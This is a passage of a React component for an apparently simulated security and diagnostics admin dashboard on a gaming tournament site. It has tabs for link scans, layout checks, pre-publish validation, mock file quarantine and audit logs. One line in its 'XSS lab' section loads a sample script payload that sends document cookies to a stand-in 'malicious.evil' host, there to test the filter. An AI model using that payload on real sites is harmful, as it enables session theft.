                            <p className="text-zinc-400 text-[11px] font-sans mt-0.5 leading-relaxed">{iss.issue}</p>
                          </div>

                          <div className="p-2.5 bg-black/60 rounded-xl border border-zinc-900/70 text-[10.5px] text-zinc-400 font-sans leading-normal">
                            <span className="text-red-550 font-mono font-bold uppercase text-[9px] mr-1 block">RECOMMENDED SOLUTION:</span>
                            {iss.suggestedSolution}
                          </div>
                        </div>

                        <div className="shrink-0 flex flex-col items-stretch sm:items-end gap-2 text-right">
                          <div className="flex items-center gap-1.5 self-end">
                            <span className="text-[10px] text-zinc-500 uppercase">Status:</span>
                            <span className={`px-2.5 py-0.5 text-[9px] rounded uppercase font-black tracking-widest border ${
                              iss.status === "resolved" ? "bg-emerald-950/40 text-emerald-400 border-emerald-900/60" :
                              iss.status === "repairing" ? "bg-blue-950/40 text-blue-400 border-blue-900/50 animate-pulse" :
                              iss.status === "manual" ? "bg-purple-955/30 text-purple-400 border-purple-900/40" :
                              "bg-red-955/20 text-red-500 border-red-950"
                            }`}>
                              {iss.status}
                            </span>
                          </div>

                          {iss.status === "detected" && (
                            <button
                              onClick={() => triggerSingleHealer(iss.id)}
                              className="px-3.5 py-2 bg-red-650 hover:bg-red-700 text-white font-mono text-[9px] font-black tracking-wider uppercase rounded-lg shadow-md cursor-pointer self-end duration-100"
                            >
                              Auto-Heal ⚡
                            </button>
                          )}

                          {iss.status === "resolved" && (
                            <span className="text-[10.5px] text-emerald-500 flex items-center gap-1 uppercase font-bold self-end">
                              <CheckCircle2 size={12} /> Auto Fixed!
                            </span>
                          )}

                          {iss.status === "manual" && (
                            <span className="text-[10px] text-zinc-500 uppercase font-bold text-right">
                              Requires administrator review
                            </span>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </motion.div>
            )}

            {/* 2. AUTOMATIC SCAN TAB */}
            {activeTab === "scans" && (
              <motion.div
                key="scans-tab"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                <div className="bg-zinc-950 p-5 rounded-2xl border border-zinc-900 space-y-4">
                  <div className="border-b border-zinc-900 pb-2 flex justify-between items-center">
                    <h4 className="text-xs font-black text-white uppercase tracking-widest flex items-center gap-1.5 font-mono">
                      <Cpu size={14} className="text-red-550" />
                      WEBSITE SCANNER DEEP DIAGNOSTIC
                    </h4>
                    <span className="text-[9px] text-zinc-500 font-mono">Heuristic Core: v4.2.1-Sentinel</span>
                  </div>

                  <p className="text-xs text-zinc-400 font-sans leading-relaxed">
                    Continuously checks website assets, dead relative anchors, missing image templates, broken font faces, faulty submission handlers, API network response statuses, and database schemas alignment.
                  </p>

                  <div className="bg-black/60 p-5 rounded-xl border border-zinc-900 space-y-4">
                    <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
                      <div className="space-y-1">
                        <span className="text-[9.5px] text-zinc-500 font-mono uppercase block">Diagnostic Scanning Engine</span>
                        <h5 className="text-sm font-black text-white uppercase font-mono">
                          {isScanning ? "⏳ Running deep file diagnostics..." : "Scan standby: Ready for full platform inspection"}
                        </h5>
                      </div>

                      <button
                        onClick={startFullWebsiteScan}
                        disabled={isScanning}
                        className="px-4 py-2.5 bg-red-650 hover:bg-red-700 text-white font-mono text-[10px] font-black uppercase tracking-wider rounded-lg shadow-lg disabled:opacity-40 cursor-pointer shrink-0 transition-all hover:scale-[1.01]"
                      >
                        {isScanning ? "Scanning..." : "RUN FULL DIAGNOSTIC SCAN NOW 🔍"}
                      </button>
                    </div>

                    {isScanning && (
                      <div className="space-y-2">
                        <div className="w-full bg-zinc-900 rounded-full h-2 overflow-hidden">
                          <div className="bg-red-550 h-full transition-all duration-300" style={{ width: `${scanProgress}%` }} />
                        </div>
                        <div className="flex justify-between items-center font-mono text-[9.5px] text-zinc-500 uppercase">
                          <span>Analyzing relative link maps...</span>
                          <span>{scanProgress}%</span>
                        </div>
                      </div>
                    )}

                    {!isScanning && scannedMetrics.pagesChecked > 0 && (
                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs border-t border-zinc-900 pt-3">
                        <div className="bg-black/80 p-3 border border-zinc-850 rounded-xl">
                          <span className="text-zinc-500 text-[8.5px] block font-mono uppercase">Pages Checked</span>
                          <strong className="text-white font-mono">{scannedMetrics.pagesChecked}</strong>
                        </div>
                        <div className="bg-black/80 p-3 border border-zinc-850 rounded-xl">
                          <span className="text-zinc-500 text-[8.5px] block font-mono uppercase">Links Validated</span>
                          <strong className="text-emerald-400 font-mono">{scannedMetrics.linksChecked}</strong>
                        </div>
                        <div className="bg-black/80 p-3 border border-zinc-850 rounded-xl">
                          <span className="text-zinc-500 text-[8.5px] block font-mono uppercase">Assets Audited</span>
                          <strong className="text-blue-400 font-mono">{scannedMetrics.assetsChecked}</strong>
                        </div>
                        <div className="bg-black/80 p-3 border border-zinc-850 rounded-xl">
                          <span className="text-zinc-500 text-[8.5px] block font-mono uppercase">Forms Checked</span>
                          <strong className="text-amber-500 font-mono">{scannedMetrics.formsChecked}</strong>
                        </div>
                      </div>
                    )}
                  </div>

                  {/* Scanned Anomalies list with self heal button */}
                  {detectedScanAnomalies.length > 0 && (
                    <div className="space-y-2.5 pt-2">
                      <strong className="text-[10px] font-mono text-zinc-400 block uppercase">
                        🔍 CURRENT AUTOMATIC SCAN REPORT (Detected Anomalies)
                      </strong>
                      <div className="space-y-2">
                        {detectedScanAnomalies.map((anom, idx) => (
                          <div
                            key={idx}
                            className="bg-black/40 border border-zinc-900 rounded-xl p-3 flex justify-between items-center text-xs font-mono"
                          >
                            <div className="space-y-1">
                              <div className="flex items-center gap-2">
                                <span className={`px-1.5 py-0.2 rounded text-[8px] font-black uppercase ${
                                  anom.severity === "high" ? "bg-red-950 text-red-400" :
                                  anom.severity === "medium" ? "bg-yellow-950 text-yellow-400" :
                                  "bg-zinc-800 text-zinc-400"
                                }`}>
                                  {anom.severity}
                                </span>
                                <strong className="text-zinc-200">{anom.name}</strong>
                              </div>
                              <p className="text-[10.5px] text-zinc-500">Classification: {anom.type}</p>
                            </div>

                            <div className="shrink-0">
                              {anom.status === "detected" ? (
                                <button
                                  onClick={() => autoRepairScannedIssue(idx)}
                                  className="px-3 py-1.5 bg-zinc-900 hover:bg-zinc-800 hover:text-emerald-400 border border-zinc-800 text-zinc-400 font-bold uppercase rounded text-[9px]"
                                >
                                  Heal script ⚡
                                </button>
                              ) : anom.status === "repairing" ? (
                                <span className="text-[9.5px] text-blue-400 animate-pulse uppercase">Repairing...</span>
                              ) : (
                                <span className="text-[9.5px] text-emerald-400 flex items-center gap-1 uppercase font-bold">
                                  <CheckCircle2 size={10} /> Clean Repaired
                                </span>
                              )}
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                </div>
              </motion.div>
            )}

            {/* 3. RESPONSIVE VALIDATION TAB */}
            {activeTab === "responsive" && (
              <motion.div
                key="responsive-tab"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                <div className="bg-zinc-950 p-5 rounded-2xl border border-zinc-900 space-y-4">
                  <div className="border-b border-zinc-900 pb-2 flex justify-between items-center">
                    <h4 className="text-xs font-black text-white uppercase tracking-widest flex items-center gap-1.5 font-mono">
                      <Monitor size={14} className="text-red-550" />
                      CROSS-DEVICE RESPONSIVE RESOLUTION VALIDATOR
                    </h4>
                    <span className="text-[9px] text-zinc-500 font-mono">Simulators Count: 5 viewports</span>
                  </div>

                  <p className="text-xs text-zinc-400 font-sans leading-relaxed">
                    Checks layout structures across multiple breakpoints. It automatically scans for cropped container boundaries, overlapping menu buttons, hidden trigger handles, structural margins, horizontal scrollbars, and misaligned texts.
                  </p>

                  <div className="bg-black/50 border border-zinc-900 rounded-xl p-4 flex flex-col sm:flex-row items-center justify-between gap-4">
                    <div className="space-y-1">
                      <strong className="text-white text-xs block font-mono uppercase">🛠️ Viewport Layout Auto-Healer Engine</strong>
                      <span className="text-[10.5px] text-zinc-500">Correct viewport constraints dynamically by wrapping parent elements and removing rigid overflows.</span>
                    </div>

                    <button
                      onClick={runResponsiveLayoutRepair}
                      disabled={isRepairingLayout}
                      className="px-4 py-2.5 bg-red-650 hover:bg-red-700 text-white font-mono text-[9.5px] font-black uppercase tracking-wider rounded-lg disabled:opacity-45 cursor-pointer shrink-0 transition-all"
                    >
                      {isRepairingLayout ? "Optimizing viewports..." : "CORRECT LAYOUT CONSTRAINTS ⚡"}
                    </button>
                  </div>

                  {/* Device matrix */}
                  <div className="space-y-3">
                    {responsiveDevices.map((dev, idx) => (
                      <div
                        key={idx}
                        className="bg-black/60 border border-zinc-900 p-4 rounded-xl flex flex-col md:flex-row md:items-center justify-between gap-4 font-mono text-xs"
                      >
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            {idx === 0 ? <Smartphone size={14} className="text-zinc-400" /> :
                             idx === 1 ? <Tablet size={14} className="text-zinc-400" /> :
                             idx === 2 ? <Laptop size={14} className="text-zinc-400" /> :
                             <Monitor size={14} className="text-zinc-400" />}
                            <strong className="text-white text-xs">{dev.device}</strong>
                            <span className="text-zinc-550 text-[10px]">({dev.width})</span>
                          </div>

                          {/* Error categories indicators */}
                          <div className="flex flex-wrap gap-x-3 gap-y-1 pt-1.5 text-[10px]">
                            <span className={dev.overlappingElements ? "text-red-500" : "text-emerald-500"}>
                              • Overlapping buttons: {dev.overlappingElements ? "⚠️ DETECTED" : "✓ OK"}
                            </span>
                            <span className={dev.horizontalScrolling ? "text-red-500" : "text-emerald-500"}>
                              • Horizontal Scrolling: {dev.horizontalScrolling ? "⚠️ DRIFT EXCEEDED" : "✓ OK"}
                            </span>
                            <span className={dev.croppedContent ? "text-red-500" : "text-emerald-500"}>
                              • Cropped layouts: {dev.croppedContent ? "⚠️ DETECTED" : "✓ OK"}
                            </span>
                            <span className={dev.misalignedText ? "text-red-500" : "text-emerald-500"}>
                              • Misaligned text: {dev.misalignedText ? "⚠️ DRIFT" : "✓ OK"}
                            </span>
                          </div>
                        </div>

                        <span className={`px-2.5 py-1 text-[9.5px] rounded uppercase font-black tracking-wider border shrink-0 ${
                          dev.overallStatus === "Optimal" ? "bg-emerald-950 text-emerald-400 border-emerald-900/60" :
                          dev.overallStatus === "Repaired" ? "bg-blue-955 text-blue-400 border-blue-900/50" :
                          "bg-red-955/20 text-red-500 border-red-950/40 animate-pulse"
                        }`}>
                          {dev.overallStatus}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              </motion.div>
            )}

            {/* 4. PRE-PUBLISH GATEKEEPER TAB */}
            {activeTab === "prepublish" && (
              <motion.div
                key="prepublish-tab"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                <div className="bg-zinc-950 p-5 rounded-2xl border border-zinc-900 space-y-4">
                  <div className="border-b border-zinc-900 pb-2 flex justify-between items-center">
                    <h4 className="text-xs font-black text-white uppercase tracking-widest flex items-center gap-1.5 font-mono">
                      <FileCheck size={14} className="text-red-550" />
                      PRE-PUBLISH DEPLOYMENT VALIDATOR
                    </h4>
                    <span className="text-[9px] text-zinc-500 font-mono">Status: CI/CD Pipeline</span>
                  </div>

                  <p className="text-xs text-zinc-400 font-sans leading-relaxed">
                    Before deploying or publishing any new tournament rosters, squad registrations, or custom layout overrides, run the pre-publish validator to verify there are zero critical warnings or broken interactive handlers.
                  </p>

                  <div className="bg-black/60 p-5 rounded-xl border border-zinc-900 space-y-4 font-mono">
                    <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
                      <div>
                        <span className="text-[10px] text-zinc-500 uppercase block">CI/CD Gatekeeper Release Status</span>
                        <h5 className="text-sm font-black text-white uppercase mt-0.5">
                          {prePublishStatus === "idle" && "Ready for deployment verification"}
                          {prePublishStatus === "running" && "⏳ Verification script executing..."}
                          {prePublishStatus === "passed" && "🚀 PASS: Ready to release"}
                          {prePublishStatus === "blocked" && "❌ RELEASE BLOCKED: Unresolved critical database errors exist"}
                        </h5>
                      </div>

                      <button
                        onClick={runPrePublishSuite}
                        disabled={prePublishStatus === "running"}
                        className="px-4 py-2.5 bg-red-650 hover:bg-red-700 text-white font-mono text-[9.5px] font-black uppercase tracking-wider rounded-lg disabled:opacity-40 cursor-pointer shrink-0 transition-all duration-100 hover:scale-[1.01]"
                      >
                        {prePublishStatus === "running" ? "Running suite..." : "EXECUTE DEPLOYMENT VERIFICATION"}
                      </button>
                    </div>

                    {prePublishStatus === "running" && (
                      <div className="space-y-2">
                        <div className="w-full bg-zinc-900 rounded-full h-1.5 overflow-hidden">
                          <div className="bg-red-550 h-full transition-all duration-200" style={{ width: `${prePublishProgress}%` }} />
                        </div>
                        <div className="flex justify-between items-center text-[9px] text-zinc-500 uppercase">
                          <span>Testing relative navigation pointers...</span>
                          <span>{prePublishProgress}%</span>
                        </div>
                      </div>
                    )}
                  </div>

                  {/* Checklist items */}
                  <div className="space-y-2.5 pt-2">
                    <strong className="text-[10px] font-mono text-zinc-400 block uppercase">
                      📋 DEPLOYMENT REQUIREMENTS CHECKLIST
                    </strong>
                    <div className="space-y-2">
                      {prePublishChecklist.map((chk, idx) => (
                        <div
                          key={idx}
                          className="bg-black/40 border border-zinc-900 p-3 rounded-xl flex items-center justify-between gap-4 text-xs font-mono"
                        >
                          <div className="flex items-center gap-2.5">
                            {chk.checked ? (
                              <CheckCircle2 size={14} className="text-emerald-400 shrink-0" />
                            ) : (
                              <div className="w-3.5 h-3.5 rounded border border-zinc-700 shrink-0" />
                            )}
                            <span className={chk.checked ? "text-zinc-300" : "text-zinc-500"}>
                              {chk.name}
                            </span>
                          </div>

                          <span className="text-[8.5px] font-black tracking-wider uppercase shrink-0 text-zinc-550 bg-zinc-900 border border-zinc-800 px-1.5 py-0.5 rounded">
                            {chk.mandatory ? "Mandatory" : "Optional"}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

            {/* 5. FIREWALL & THREAT SHIELD TAB */}
            {activeTab === "security" && (
              <motion.div
                key="security-tab"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                {/* Threat alerts queue */}
                <div className="bg-zinc-950 p-5 rounded-2xl border border-zinc-900 space-y-4">
                  <div className="flex justify-between items-center border-b border-zinc-900 pb-2">
                    <h4 className="text-xs font-black text-stone-200 uppercase tracking-widest flex items-center gap-1.5 font-mono">
                      <ShieldAlert size={14} className="text-red-550" />
                      SUSPICIOUS SECURITY EVENTS SHIELD
                    </h4>
                    <span className="text-[8.5px] bg-red-955/20 text-red-500 font-black px-2 py-0.5 rounded font-mono border border-red-900/40">
                      WAF CORES: OPERATIONAL
                    </span>
                  </div>

                  <div className="space-y-2.5">
                    {threats.map(thr => (
                      <div key={thr.id} className="bg-black/60 p-3.5 rounded-xl border border-zinc-900 flex flex-col sm:flex-row justify-between sm:items-center gap-3 text-xs font-mono">
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            <span className="text-red-550 font-black font-mono">[Intercept ID #{thr.id}]</span>
                            <span className="text-zinc-300 font-bold font-sans text-xs leading-none">{thr.type}</span>
                          </div>
                          <p className="text-[11px] text-zinc-500 font-mono">Source attacker IP node: <span className="text-stone-300">{thr.source}</span> ({thr.time})</p>
                        </div>

                        <span className={`px-2 py-0.5 text-[9px] rounded font-black uppercase border shrink-0 text-center ${
                          thr.status === "blocked" ? "bg-red-955/40 text-red-400 border-red-900/60" :
                          thr.status === "challenged" ? "bg-yellow-95/20 text-yellow-400 border-yellow-900/40" :
                          "bg-purple-95/20 text-purple-400 border-purple-900/40"
                        }`}>
                          {thr.status}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Account protection settings modules */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  
                  {/* Heuristic Multi-engine file quarantine */}
                  <div className="bg-zinc-950 p-5 rounded-2xl border border-zinc-900 space-y-4">
                    <h4 className="text-xs font-black text-white uppercase tracking-widest font-mono flex items-center gap-1.5">
                      <Server size={14} className="text-red-555" /> HEURISTIC ISOLATION FILES SCANNER
                    </h4>
                    <p className="text-[11.5px] text-zinc-500 font-sans leading-relaxed">
                      Simulate file uploads to verify automated Trojan, bat, and executable quarantine routines on waitlist attachments.
                    </p>

                    <div className="border border-dashed border-red-500/25 bg-black/45 p-4 rounded-xl flex flex-col items-center justify-center text-center space-y-2">
                      <Upload size={18} className="text-red-550" />
                      <div className="space-y-0.5">
                        <span className="text-xs font-black text-white block font-mono">SUBMIT MOCK SQUAD SCRIM ATTACHMENT</span>
                        <span className="text-[8.5px] text-zinc-500 font-mono">File filters: PNG, JPEG, JSON (Max 4MB)</span>
                      </div>

                      <div className="flex gap-2 pt-1">
                        <button
                          onClick={() => simulateFileUploadScan(false)}
                          disabled={isFileScanning}
                          className="px-2.5 py-1.5 bg-zinc-900 hover:bg-zinc-850 hover:text-emerald-400 border border-zinc-800 text-[8.5px] uppercase font-mono font-bold text-zinc-400 rounded transition-all"
                        >
                          Upload Safe File
                        </button>

                        <button
                          onClick={() => simulateFileUploadScan(true)}
                          disabled={isFileScanning}
                          className="px-2.5 py-1.5 bg-zinc-900 hover:bg-zinc-850 hover:text-red-500 border border-zinc-800 text-[8.5px] uppercase font-mono font-bold text-zinc-400 rounded transition-all"
                        >
                          Upload Malicious Code
                        </button>
                      </div>
                    </div>

                    {isFileScanning && (
                      <div className="text-[9px] text-red-400 animate-pulse font-mono text-center">
                        ⏳ Running multi-engine validation logs heuristics...
                      </div>
                    )}

                    <div className="bg-black p-3 rounded-lg space-y-1.5 text-[9.5px] font-mono border border-zinc-900">
                      <span className="text-zinc-500 block uppercase text-[8px] font-bold">Scanning History isolation vault</span>
                      {scannedFiles.map((f, idx) => (
                        <div key={idx} className="flex justify-between items-center border-b border-zinc-900/50 pb-1 last:border-0 last:pb-0">
                          <span className="text-stone-300 truncate max-w-[150px]">{f.name}</span>
                          <span className={f.status === "clean" ? "text-emerald-400" : "text-red-500 font-bold"}>
                            {f.status === "clean" ? "✓ Clean verified" : `⚠️ Isolated: ${f.detection}`}
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Anti-Spam / XSS Checker lab */}
                  <div className="bg-zinc-950 p-5 rounded-2xl border border-zinc-900 space-y-4">
                    <h4 className="text-xs font-black text-white uppercase tracking-widest font-mono flex items-center gap-1.5">
                      <Sliders size={14} className="text-red-555" /> CHAT XSS & SPAM REACTION LAB
                    </h4>
                    <p className="text-[11.5px] text-zinc-500 font-sans leading-relaxed">
                      Type test messages containing repeated tags, scripts or spam tokens below to inspect the real-time intercept blocks.
                    </p>

                    <div className="space-y-3 font-mono">
                      <textarea
                        value={spamInput}
                        onChange={(e) => setSpamInput(e.target.value)}
                        placeholder="Type mock text (e.g. JOIN DISCORD TO WIN FREE COINS NOW hacks...)"
                        className="w-full bg-black border border-zinc-850 p-2 text-xs text-white rounded outline-none focus:border-red-500 h-16"
                      />

                      <div className="flex gap-2">
                        <button
                          onClick={handleSpamLabCheck}
                          className="px-3.5 py-1.5 bg-red-650 hover:bg-red-700 text-white font-mono text-[9px] font-black uppercase rounded cursor-pointer"
                        >
                          SCAN TEXT CONTENT
                        </button>
                        <button
                          onClick={() => {
                            setSpamInput("<script>fetch('https://malicious.evil/steal?cookie='+document.cookie)</script>");
                            setSpamResult(null);
                          }}
                          className="px-2 py-1 bg-zinc-900 border border-zinc-800 text-zinc-400 text-[8px] uppercase font-bold rounded"
                        >
                          Load Malicious XSS
                        </button>
                      </div>

                      {spamResult && (
                        <div className={`p-3 rounded-lg border text-xs font-mono leading-relaxed ${
                          spamResult.isSpam 
                            ? "bg-red-955/30 border-red-900/60 text-red-400" 
                            : "bg-emerald-95/10 border-emerald-900/40 text-emerald-400"
                        }`}>
                          <strong className="block text-[9.5px] uppercase font-black tracking-wide">
                            {spamResult.isSpam ? "🚨 SPAM / EXPLOIT INTERCEPTED" : "🟢 INPUT SAFETY VERIFIED"}
                          </strong>
                          <p className="text-[10px] mt-0.5">Vulnerability rating: {spamResult.confidence}% confidence</p>
                          <p className="text-[9.5px] text-zinc-400">Trigger token: {spamResult.trigger}</p>
                        </div>
                      )}
                    </div>
                  </div>

                </div>
              </motion.div>
            )}

            {/* 6. DETAILED LOG LEDGER TAB */}
            {activeTab === "logs" && (
              <motion.div
                key="logs-tab"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                <div className="bg-zinc-950 p-5 rounded-2xl border border-zinc-900 space-y-4">
                  <div className="border-b border-zinc-900 pb-2">
                    <h4 className="text-xs font-black text-white uppercase tracking-widest font-mono flex items-center gap-1.5">
                      <Terminal size={14} className="text-red-555" />
                      MASTER AUDIT TRAIL LOGS
                    </h4>
                  </div>

                  <p className="text-xs text-zinc-400 font-sans leading-relaxed">
                    Provides a permanent chronological record of every anomaly detected, repairs performed, and action taken by administrators on the platform for complete compliance audit trials.
                  </p>

                  <div className="overflow-x-auto">
                    <table className="w-full text-left border-collapse text-[11px] font-mono">
                      <thead>
                        <tr className="border-b border-zinc-850 text-zinc-500 uppercase text-[9px]">
                          <th className="py-2.5 px-2">Log ID</th>
                          <th className="py-2.5 px-2">Timestamp</th>
                          <th className="py-2.5 px-2">Module</th>
                          <th className="py-2.5 px-2">Anomaly Classification</th>
                          <th className="py-2.5 px-2">Severity</th>
                          <th className="py-2.5 px-2">Repairs Done</th>
                        </tr>
                      </thead>
                      <tbody>
                        {issues.map(iss => (
                          <tr key={iss.id} className="border-b border-zinc-900/60 hover:bg-zinc-900/20 text-zinc-300">
                            <td className="py-2.5 px-2 text-red-500 font-bold">{iss.id}</td>
                            <td className="py-2.5 px-2 text-zinc-400">{iss.timestamp}</td>
                            <td className="py-2.5 px-2 uppercase text-[9.5px] font-black text-white">{iss.feature}</td>
                            <td className="py-2.5 px-2 text-zinc-400 leading-normal max-w-xs">{iss.issue}</td>
                            <td className="py-2.5 px-2 uppercase font-black text-[9px]">
                              <span className={
                                iss.severity === "critical" ? "text-red-400" :
                                iss.severity === "high" ? "text-orange-400" :
                                iss.severity === "medium" ? "text-yellow-400" :
                                "text-zinc-500"
                              }>
                                {iss.severity}
                              </span>
                            </td>
                            <td className="py-2.5 px-2">
                              <span className={`px-2 py-0.5 rounded text-[8.5px] uppercase font-black tracking-wider leading-none ${
                                iss.status === "resolved" ? "bg-emerald-950 text-emerald-400 border border-emerald-900/30" :
                                "bg-zinc-900 text-zinc-400"
                              }`}>
                                {iss.status === "resolved" ? "Completed" : "Awaiting Fix"}
                              </span>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </div>
              </motion.div>
            )}

          </AnimatePresence>
        </div>

        {/* WORKSPACE RIGHT AREA (SECURITY CO-PILOT AI & LIVE AUDIT FEED) */}
        <div className="lg:col-span-4 space-y-6">
          
          {/* SECURE AUTOMATIC SCANNING CONFIG MODULE */}
          <div className="bg-zinc-950 border border-zinc-900 rounded-2xl p-4 space-y-3 font-mono">
            <div className="flex items-center gap-2 border-b border-zinc-900 pb-2">
              <Sparkles size={13} className="text-red-550 animate-pulse" />
              <strong className="text-xs uppercase font-black text-stone-200">AUTO-HEAL TRIGGER PANEL</strong>
            </div>
            
            <p className="text-[10px] text-zinc-500 font-sans leading-normal">
              Toggle continuous autonomous scanner modules. When active, the system executes silent layout, link, and database repairs.
            </p>

            <div className="space-y-2 text-xs">
              {[
                { name: "Continuous Layout Healing", active: true },
                { name: "Heartbeat Link Verification", active: true },
                { name: "Anti-Spam Filter Webhooks", active: true },
                { name: "Auto-Block SQL Tokens", active: true }
              ].map((cfg, idx) => (
                <div key={idx} className="flex justify-between items-center bg-black/45 p-2 rounded border border-zinc-900 text-[10.5px]">
                  <span className="text-zinc-400">{cfg.name}</span>
                  <span className="text-emerald-400 font-bold uppercase text-[9px] flex items-center gap-1">
                    <CheckCircle2 size={10} /> Active
                  </span>
                </div>
              ))}
            </div>
          </div>

          {/* ACTIVE AUDIT LOGS OVERRIDES TERMINAL */}
          <div className="bg-zinc-950 border border-zinc-900 rounded-2xl p-4 space-y-4 font-mono">
            <div className="flex justify-between items-center border-b border-zinc-900 pb-2">
              <strong className="text-xs uppercase font-black text-stone-200 flex items-center gap-1.5">
                <Terminal size={12} className="text-red-550" />
                INTEGRITY AUDIT RUNTIME FEED
              </strong>
              <button
                onClick={() => setLiveTerminalLogs([`[${new Date().toLocaleTimeString()}] 🪐 Terminal feed buffer cleared.`])}
                className="text-[8.5px] text-zinc-500 hover:text-zinc-300 uppercase cursor-pointer"
              >
                Clear
              </button>
            </div>

            <div className="space-y-2 max-h-[280px] overflow-y-auto pr-1">
              {liveTerminalLogs.map((log, idx) => (
                <div key={idx} className="font-mono text-[9px] text-zinc-400 leading-snug border-b border-zinc-900/60 pb-1.5 last:border-0">
                  {log}
                </div>
              ))}
            </div>
          </div>

        </div>

      </div>

    </div>
  );
}
